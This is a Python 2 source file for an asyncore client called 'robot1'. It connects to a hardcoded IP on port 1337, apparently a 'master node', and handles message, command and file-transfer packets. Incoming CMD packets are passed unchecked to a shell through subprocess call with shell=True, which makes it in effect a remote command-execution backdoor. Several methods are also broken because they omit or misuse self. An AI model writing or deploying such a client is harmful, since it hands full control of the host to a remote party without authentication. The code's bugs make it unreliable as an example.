from __future__ import print_function

import asyncore
import collections
import re
from subprocess import call
import logging
import socket


MAX_MESSAGE_LENGTH = 1024

# ********** OUTGOING PACKET PROTOCOLS **********
# (Prefix) (Parameters)
# ACC     | [filename, max data per fragment]
# FACK    | [filename]
# ***********************************************

# ********** INCOMING PACKET PROTOCOLS **********
# (Prefix) (Parameters)
# MSG     | [message text]
# CMD     | [command prompt}]
# FTREQ   | [filename, filesize]
# BEG     | [filename, number of fragments]
# DATA    | [filename, sequence id, data]
# END     | [filename, number of sent fragments]
# ***********************************************

class Packet(object):
    def __init__(self, prefix, params=[], *args):
        self.prefix = prefix
        self.params = params

    def __str__(self):
        msg_form = ']||['
        msg_form += self.prefix
        msg_form += ']||['
        for x in range(0,len(self.params)):
            msg_form += str(self.params[x])
            msg_form += ']||['
        return msg_form

class FileTransferManager(object):

    def __init__(self, clientObj):
        self.clientObj = clientObj

    def process_FT_packet(p_segments):
        header = p_segments.pop(0)
        args = p_segments

        # if transfer request
        if header == 'FTREQ':
            filename = args[0]
            filesize = args[1]
            # form ACC (accept request) response object
            prefix = 'ACC'
            params = [filename,MAX_MESSAGE_LENGTH]
            ACC_packet = Packet(prefix, params)
            # send back ACC packet
            logging.info('Sending back %s', ACC_packet)
            self.clientObj.say(ACC_packet)


class Client(asyncore.dispatcher):

    def __init__(self, host_address, name):
        asyncore.dispatcher.__init__(self)
        self.fileTransferManager = FileTransferManager(self)
        self.log = logging.getLogger('Client (%7s)' % name)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.name = name
        self.log.info('Connecting to host at %s', host_address)
        self.connect(host_address)
        self.outbox = collections.deque()

    # open up shell and execute prompt
    def output_message(self, message):
        self.log.info('Received message: %s', message)

    def execute_prompt(self, cmd):
        call(cmd, shell=True)

    # prep message for sending
    def say(self, message):
        self.outbox.append(message)
        self.log.info('Enqueued message: %s', message)

    def parse_packet(self, packet):
        segments = filter(None,packet.split("]||["))
        # packet type (CMD, MSG, etc)
        p_type = segments[0]
        if p_type == 'MSG':
            message = segments[1]
            output_message(message)

        elif p_type == 'CMD':
            command = segments[1]
            execute_prompt(command)

        elif p_type == 'FTREQ' or p_type == 'BEG' or p_type == 'DATA' or p_type == 'END':
            self.fileTransferManager.process_FT_packet(segments)

    # called when data is being sent
    def handle_write(self):
        if not self.outbox:
            return
        message = self.outbox.popleft()
        if len(message) > MAX_MESSAGE_LENGTH:
            raise ValueError('Message too long')
        self.send(message)

    # called when data is received
    def handle_read(self):
        packet = self.recv(MAX_MESSAGE_LENGTH)
        self.log.info('Received Packed: %s', packet)
        self.parse_packet(packet)

        # OLD
        # message = self.recv(MAX_MESSAGE_LENGTH)
        # if message.startswith('||'):
        #     self.log.info('INCOMING TRANSFER')
        #     self.log.info('Received message: %s', message)
        # elif message.startswith('**'):
        #     self.log.info('COMMAND PROMPT')
        #     self.log.info('Received message: %s', message)
        #     cmd = message[2:-2]
        #     logging.info(cmd)
        #     self.execute_prompt(cmd)
        # else:
        #     self.log.info('Received message: %s', message)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    logging.info('Creating client')
    # change IP to your master node's machine IP and port
    alice = Client(('174.129.126.220',1337),'robot1')
    # alice.say('Hello, everybody!')
    asyncore.loop()